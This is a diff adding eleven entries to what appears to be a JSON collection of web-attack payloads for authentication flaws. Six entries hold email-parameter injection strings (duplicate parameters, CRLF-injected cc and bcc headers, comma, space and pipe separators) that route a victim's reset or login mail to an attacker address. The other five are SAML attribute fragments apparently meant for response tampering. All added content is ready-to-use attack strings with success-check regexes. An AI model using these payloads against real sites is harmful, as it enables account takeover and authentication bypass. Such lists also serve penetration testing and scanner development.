@@ -9029,5 +9029,126 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-210857",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "email=victim@mail.com&email=hacker@mail.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210859",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "email=victim@mail.com%0A%0Dcc:hacker@mail.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210860",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "email=victim@mail.com%0A%0Dbcc:hacker@mail.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210861",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "email=victim@mail.com,hacker@mail.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210862",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "email=victim@mail.com%20hacker@mail.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210863",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "email=victim@mail.com|hacker@mail.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242697",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "Destination=\"https://idptestbed/Shibboleth.sso/SAML2/POST\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242698",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "ID=\"_04cfe67e596b7449d05755049ba9ec28\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242699",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "InResponseTo=\"_dbbb85ce7ff81905a3a7b4484afb3a4b\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242702",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "Name=\"urn:oid:0.9.2342.19200300.100.1.1\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242703",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
   }
 ]
